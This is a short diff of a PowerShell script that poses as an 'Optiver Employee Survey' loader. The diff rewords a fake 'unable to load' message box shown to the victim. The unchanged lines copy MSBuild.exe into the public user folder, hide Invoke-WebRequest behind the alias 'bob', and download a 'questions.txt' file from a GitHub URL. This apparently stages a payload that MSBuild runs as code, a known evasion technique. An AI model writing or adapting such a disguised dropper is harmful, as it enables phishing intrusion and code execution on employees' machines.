@@ -1,4 +1,6 @@
-[System.Windows.MessageBox]::Show('Failed to load Optiver Employee Survey, please try again later')
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$msgBody = "Unable to load Optiver Employee Survey at this time, please try again later"
+[System.Windows.MessageBox]::Show($msgBody)
 copy-item C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe c:\users\public\MSBuild.exe
 set-alias -name bob -value iwr
 bob 'https://raw.githubusercontent.com/erinsuthers/survey/main/questions.txt' -UseBasicParsing -outfile "c:\users\public\questions.txt"
